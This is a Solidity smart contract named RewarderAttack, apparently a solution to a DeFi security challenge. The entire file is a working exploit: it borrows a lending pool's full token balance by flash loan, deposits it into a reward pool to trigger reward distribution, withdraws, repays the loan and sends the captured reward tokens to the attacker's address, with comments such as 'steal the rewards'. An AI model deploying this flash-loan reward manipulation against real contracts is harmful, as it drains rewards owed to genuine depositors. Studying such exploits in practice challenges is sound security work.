// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashPool {
    function flashLoan(uint256 borrowAmount) external;
}
interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external;
}
contract RewarderAttack  {
    IFlashPool immutable lendingPool;
    IRewardPool immutable rewardPool;
    IERC20 immutable rewardToken;
    IERC20 immutable liquidityToken;
    address private immutable attacker;

    constructor(address _lendingPoolAddress, address _rewardPoolAddress,    
                IERC20 _liquidityTokenAddress, IERC20 _rewardTokenAddress) {
        lendingPool = IFlashPool(_lendingPoolAddress);
        rewardPool = IRewardPool(_rewardPoolAddress);
        liquidityToken = IERC20(_liquidityTokenAddress);
        rewardToken = IERC20(_rewardTokenAddress);
        attacker = msg.sender;
    }
   function Attack () external  {
        // How manytokens can we borrow? 
        uint256 balance = liquidityToken.balanceOf( address(lendingPool));
        require (balance > 0, "No tokens to borrow");
        // borrow as many tokens as possible
        lendingPool.flashLoan(balance);
   }

   function receiveFlashLoan(uint256 amount) external {
        // deposit them into the rewarder pool

        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        // claim rewards
        rewardPool.distributeRewards();
        // withdraw rewards
        rewardPool.withdraw(amount);
        // pay back the loan
        liquidityToken.transfer(address(lendingPool), amount);
        uint tokens = rewardToken.balanceOf(address(this));
        // finally, steal the rewards
        rewardToken.transfer(attacker, tokens);
   }

 
}